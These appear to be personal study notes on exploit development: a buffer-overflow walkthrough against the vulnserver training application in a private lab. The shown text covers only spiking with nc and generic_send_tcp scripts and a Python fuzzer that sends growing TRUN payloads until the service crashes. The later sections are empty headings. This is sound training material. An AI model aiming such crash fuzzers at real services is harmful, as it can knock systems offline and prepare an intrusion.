# Exploit Development

* Buffer Overflow - vulnerability in which data can be written which exceeds allocated space, so that we can overwrite data.

* Steps to conduct a buffer overflow:

  * [Spiking](#spiking)

  * [Fuzzing](#fuzzing)

  * [Finding the Offset](#finding-the-offset)

  * [Overwriting the EIP](#overwriting-the-eip)

  * [Finding Bad Characters](#finding-bad-characters)

  * [Finding the Right Module](#finding-the-right-module)

  * [Generating Shellcode](#generating-shellcode)

  * Root Access

## Spiking

* Initial setup is to attach the vulnserver application in Immunity Debugger, in running mode.

* We know the IP of our Windows machine and the vulnserver port, so we can connect in Kali machine using ```nc```.

```shell
nc -nv 192.168.30.139 9999
```

* For spiking, we can use a tool called ```generic_send_tcp```. We will try different random characters to break the program.

* We would do this with the help of a spike script.

```shell
#stats.spk
s_readline();
s_string("STATS ");
s_string_variable("0");
```

```shell
#trun.spk
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

```shell
generic_send_tcp
#shows syntax format

generic_send_tcp 192.168.30.139 9999 stats.spk 0 0

generic_send_tcp 192.168.30.139 9999 trun.spk 0 0
#this crashes the vulnserver due to buffer overflow
```

## Fuzzing

* Similar to spiking, we would send a bunch of characters at a specific command and try to break it. The difference is that we would attack a particular command in fuzzing.

```python
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
        try:
                payload = "TRUN /.:/" + buffer
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.30.139',9999))
                print("[+] Sending the payload\n" + str(len(buffer)))
                s.send((payload.encode()))
                s.close()
                sleep(1)
                buffer = buffer + "A"*100

        except:
                print("Fuzzing crashed at %s bytes" % (str(len(buffer))))
                sys.exit()
               
```

```shell
vim fuzzingscript.py

chmod +x fuzzingscript.py

./fuzzingscript.py
#around 2000-3000 bytes, Immunity Debugger crashes
#fuzzing gives us an idea about the limit
```

## Finding the Offset

## Overwriting the EIP

## Finding Bad Characters

## Finding the Right Module

## Generating Shellcode
